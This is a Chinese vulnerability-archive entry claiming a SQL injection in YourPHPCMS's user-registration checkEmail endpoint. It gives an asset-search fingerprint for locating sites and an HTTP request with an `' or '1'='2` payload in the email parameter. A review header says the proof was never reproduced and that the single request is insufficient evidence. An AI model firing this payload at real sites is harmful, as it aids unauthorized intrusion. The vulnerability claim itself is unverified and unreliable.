---
source: "wy876 漏洞文库"
product: "YourPHPCMS/User Register"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YourPHPCMSRegister_checkEmail存在sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：仅产品名，无版本或前置权限"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-5fc94f2bc87144135d08ff0f"
entity_id: "ve-5fc94f2bc87144135d08ff0f"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅产品名，无版本或前置权限

代码与实验材料：只有单个or1=2混合引号请求、空Host，无真假对照、响应、SQL错误或源码

来源证据范围：wy876/语雀转载，缺修复来源

- **适用与权限边界（1）**：单请求不足以证明SQL注入；依据：只有email参数及or条件，无响应和对照；尾部双引号语义不明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：分类/范围不规范；依据：CMS产品在PHP目录、代码块标rust，未列版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YourPHPCMS Register_checkEmail存在sql注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">YourPHPCMS Register_checkEmail存在sql注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ YourPHPCMS

# 三、资产测绘
```rust
header="YP_onlineid"
```


# 四、漏洞复现
```http
GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sgms1fg0nfgaavx3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
